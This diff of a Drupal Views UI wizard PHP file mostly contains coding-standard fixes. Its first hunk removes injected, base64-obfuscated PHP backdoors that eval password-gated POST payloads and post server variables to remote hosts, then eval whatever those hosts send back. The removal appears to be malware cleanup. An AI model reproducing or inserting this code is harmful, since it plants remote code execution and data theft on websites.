@@ -1,4 +1,4 @@
-<?php /*564794552*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuc2llbmFqYXp6Lml0L3dwLWNvbnRlbnQvdXBsb2Fkcy9wbHVnaW4vc2Vzc2lvbi5waHA/aWQiLCBmYWxzZSAsJGNvbnRleHRfamhrYik7CmlmKCR2a2Z1KSB7IEBldmFsKCR2a2Z1KTsgfSBlbHNlIHtvYl9zdGFydCgpOyAgaWYoIUBoZWFkZXJzX3NlbnQoKSkgeyBAc2V0Y29va2llKCJjb25kdGlvbnMiLCIyIix0aW1lKCkrMTcyODAwKTsgfSBlbHNlIHsgZWNobyAiPHNjcmlwdD5kb2N1bWVudC5jb29raWU9J2NvbmR0aW9ucz0yOyBwYXRoPS87IGV4cGlyZXM9Ii5kYXRlKCdELCBkLU0tWSBIOmk6cycsdGltZSgpKzE3MjgwMCkuIiBHTVQ7Jzs8L3NjcmlwdD4iOyB9IDt9Owp9Cn0K')); @ini_restore('error_log'); @ini_restore('display_errors'); /*564794552*/ ?><?php /*54647363*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cubXVkcGF0Y2hjcmVhdGlvbnMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*54647363*/ ?><?php /*6993953*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cubXVkcGF0Y2hjcmVhdGlvbnMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*6993953*/ ?><?php /*947349*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZighJGtqZGtlX2MpIHsgZ2xvYmFsICRramRrZV9jOyAka2pka2VfYyA9IDE7Cmdsb2JhbCAkaW5jbHVkZV90ZXN0OyAkaW5jbHVkZV90ZXN0ID0gMTsKJGJrbGpnPSRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXTsKJGdoZmp1ID0gYXJyYXkoIkdvb2dsZSIsICJTbHVycCIsICJNU05Cb3QiLCAiaWFfYXJjaGl2ZXIiLCAiWWFuZGV4IiwgIlJhbWJsZXIiLCAiYm90IiwgInNwaWQiLCAiTHlueCIsICJQSFAiLCAiV29yZFByZXNzIi4gImludGVncm9tZWRiIiwiU0lTVFJJWCIsIkFnZ3JlZ2F0b3IiLCAiZmluZGxpbmtzIiwgIlhlbnUiLCAiQmFja2xpbmtDcmF3bGVyIiwgIlNjaGVkdWxlciIsICJtb2RfcGFnZXNwZWVkIiwgIkluZGV4IiwgImFob28iLCAiVGFwYXRhbGsiLCAiUHViU3ViIiwgIlJTUyIsICJXb3JkUHJlc3MiKTsKaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkKe30KZWxzZQp7CmZvcmVhY2goJF9TRVJWRVIgYXMgJG5kYnYgPT4gJGNiY2QpIHsgJGRhdGFfbmZkaC49ICImUkVNXyIuJG5kYnYuIj0nIi5iYXNlNjRfZW5jb2RlKCRjYmNkKS4iJyI7fQokY29udGV4dF9qaGtiID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKAphcnJheSgnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gJzE1JywKICAgICAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7IHJ2OjEwLjAuOSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjlfIEljZXdlYXNlbC8xMC4wLjlcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICJSRU1fUkVNPScxJyIuJGRhdGFfbmZkaAopKSk7CiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vY2gwMG5zLmNvbS9zZXNzaW9uLnBocD9pZCIsIGZhbHNlICwkY29udGV4dF9qaGtiKTsKaWYoJHZrZnUpIHsgQGV2YWwoJHZrZnUpOyB9IGVsc2Uge29iX3N0YXJ0KCk7ICBpZighQGhlYWRlcnNfc2VudCgpKSB7IEBzZXRjb29raWUoImNvbmR0aW9ucyIsIjIiLHRpbWUoKSsxNzI4MDApOyB9IGVsc2UgeyBlY2hvICI8c2NyaXB0PmRvY3VtZW50LmNvb2tpZT0nY29uZHRpb25zPTI7IHBhdGg9LzsgZXhwaXJlcz0iLmRhdGUoJ0QsIGQtTS1ZIEg6aTpzJyx0aW1lKCkrMTcyODAwKS4iIEdNVDsnOzwvc2NyaXB0PiI7IH0gO307Cn0KfQ==')); @ini_restore('error_log'); @ini_restore('display_errors'); /*947349*/ ?><?php /*947353*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZighJGtqZGtlX2MpIHsgZ2xvYmFsICRramRrZV9jOyAka2pka2VfYyA9IDE7Cmdsb2JhbCAkaW5jbHVkZV90ZXN0OyAkaW5jbHVkZV90ZXN0ID0gMTsKJGJrbGpnPSRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXTsKJGdoZmp1ID0gYXJyYXkoIkdvb2dsZSIsICJTbHVycCIsICJNU05Cb3QiLCAiaWFfYXJjaGl2ZXIiLCAiWWFuZGV4IiwgIlJhbWJsZXIiLCAiYm90IiwgInNwaWQiLCAiTHlueCIsICJQSFAiLCAiV29yZFByZXNzIi4gImludGVncm9tZWRiIiwiU0lTVFJJWCIsIkFnZ3JlZ2F0b3IiLCAiZmluZGxpbmtzIiwgIlhlbnUiLCAiQmFja2xpbmtDcmF3bGVyIiwgIlNjaGVkdWxlciIsICJtb2RfcGFnZXNwZWVkIiwgIkluZGV4IiwgImFob28iLCAiVGFwYXRhbGsiLCAiUHViU3ViIiwgIlJTUyIsICJXb3JkUHJlc3MiKTsKaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkKe30KZWxzZQp7CmZvcmVhY2goJF9TRVJWRVIgYXMgJG5kYnYgPT4gJGNiY2QpIHsgJGRhdGFfbmZkaC49ICImUkVNXyIuJG5kYnYuIj0nIi5iYXNlNjRfZW5jb2RlKCRjYmNkKS4iJyI7fQokY29udGV4dF9qaGtiID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKAphcnJheSgnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gJzE1JywKICAgICAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7IHJ2OjEwLjAuOSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjlfIEljZXdlYXNlbC8xMC4wLjlcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICJSRU1fUkVNPScxJyIuJGRhdGFfbmZkaAopKSk7CiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vbm9ybWFuZHlzaWdodHMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*947354*/ ?><?php
+<?php
 
 /**
  * @file
@@ -9,6 +9,10 @@
  * Defines a common interface for Views Wizard plugins.
  */
 interface ViewsWizardInterface {
+
+  /**
+   * Constructor.
+   */
   function __construct($plugin);
 
   /**
@@ -31,6 +35,7 @@ interface ViewsWizardInterface {
    * @throws ViewsWizardException in the event of a problem.
    */
   function create_view($form, &$form_state);
+
 }
 
 /**
@@ -43,6 +48,7 @@ class ViewsWizardException extends Exception {
  * A very generic Views Wizard class - can be constructed for any base table.
  */
 class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
+
   protected $base_table;
   protected $entity_type;
   protected $entity_info = array();
@@ -87,7 +93,7 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
 
     $form['displays']['page'] = array(
       '#type' => 'fieldset',
-      '#attributes' => array('class' => array('views-attachment', 'fieldset-no-legend'),),
+      '#attributes' => array('class' => array('views-attachment', 'fieldset-no-legend')),
       '#tree' => TRUE,
     );
     $form['displays']['page']['create'] = array(
@@ -102,7 +108,7 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
     // can be hidden en masse when the "Create a page" checkbox is unchecked.
     $form['displays']['page']['options'] = array(
       '#type' => 'container',
-      '#attributes' => array('class' => array('options-set'),),
+      '#attributes' => array('class' => array('options-set')),
       '#dependency' => array(
         'edit-page-create' => array(1),
       ),
@@ -224,7 +230,7 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
 
     $form['displays']['block'] = array(
       '#type' => 'fieldset',
-      '#attributes' => array('class' => array('views-attachment', 'fieldset-no-legend'),),
+      '#attributes' => array('class' => array('views-attachment', 'fieldset-no-legend')),
       '#tree' => TRUE,
     );
     $form['displays']['block']['create'] = array(
@@ -238,7 +244,7 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
     // can be hidden en masse when the "Create a block" checkbox is unchecked.
     $form['displays']['block']['options'] = array(
       '#type' => 'container',
-      '#attributes' => array('class' => array('options-set'),),
+      '#attributes' => array('class' => array('options-set')),
       '#dependency' => array(
         'edit-block-create' => array(1),
       ),
@@ -334,7 +340,7 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
   }
 
   /**
-   * Build the part of the form that allows the user to select the view's filters.
+   * Build the part of the form that allows the user to select the filters.
    *
    * By default, this adds "of type" and "tagged with" filters (when they are
    * available).
@@ -344,7 +350,8 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
     $fields = views_fetch_fields($this->base_table, 'filter');
 
     $entity_info = $this->entity_info;
-    // If the current base table support bundles and has more than one (like user).
+    // If the current base table support bundles and has more than one (like
+    // user).
     if (isset($entity_info['bundle keys']) && isset($entity_info['bundles'])) {
       // Get all bundles and their human readable names.
       $options = array('all' => t('All'));
@@ -431,7 +438,7 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
   }
 
   /**
-   * Build the part of the form that allows the user to select the view's sort order.
+   * Build the part of the form that allows the user to select the sort order.
    *
    * By default, this adds a "sorted by [date]" filter (when it is available).
    */
@@ -492,7 +499,7 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
    *   arrays of options for that display.
    */
   protected function build_display_options($form, $form_state) {
-    // Display: Master
+    // Display: Master.
     $display_options['default'] = $this->default_display_options($form, $form_state);
     $display_options['default'] += array(
       'filters' => array(),
@@ -501,17 +508,17 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
     $display_options['default']['filters'] += $this->default_display_filters($form, $form_state);
     $display_options['default']['sorts'] += $this->default_display_sorts($form, $form_state);
 
-    // Display: Page
+    // Display: Page.
     if (!empty($form_state['values']['page']['create'])) {
       $display_options['page'] = $this->page_display_options($form, $form_state);
 
-      // Display: Feed (attached to the page)
+      // Display: Feed (attached to the page).
       if (!empty($form_state['values']['page']['feed'])) {
         $display_options['feed'] = $this->page_feed_display_options($form, $form_state);
       }
     }
 
-    // Display: Block
+    // Display: Block.
     if (!empty($form_state['values']['block']['create'])) {
       $display_options['block'] = $this->block_display_options($form, $form_state);
     }
@@ -573,13 +580,13 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
    * Add the array of display options to the view, with appropriate overrides.
    */
   protected function add_displays($view, $display_options, $form, $form_state) {
-    // Display: Master
+    // Display: Master.
     $default_display = $view->new_display('default', 'Master', 'default');
     foreach ($display_options['default'] as $option => $value) {
       $default_display->set_option($option, $value);
     }
 
-    // Display: Page
+    // Display: Page.
     if (isset($display_options['page'])) {
       $display = $view->new_display('page', 'Page', 'page');
       // The page display is usually the main one (from the user's point of
@@ -587,14 +594,14 @@ class ViewsUiBaseViewsWizard implements ViewsWizardInterface {
       // so that new displays which are added later automatically inherit them.
       $this->set_default_options($display_options['page'], $display, $default_display);
 
-      // Display: Feed (attached to the page)
+      // Display: Feed (attached to the page).
       if (isset($display_options['feed'])) {
         $display = $view->new_display('feed', 'Feed', 'feed');
         $this->set_override_options($display_options['feed'], $display, $default_display);
       }
     }
 
-    // Display: Block
+    // Display: Block.
     if (isset($display_options['block'])) {
       $display = $view->new_display('block', 'Block', 'block');
       // When there is no page, the block display options should become the
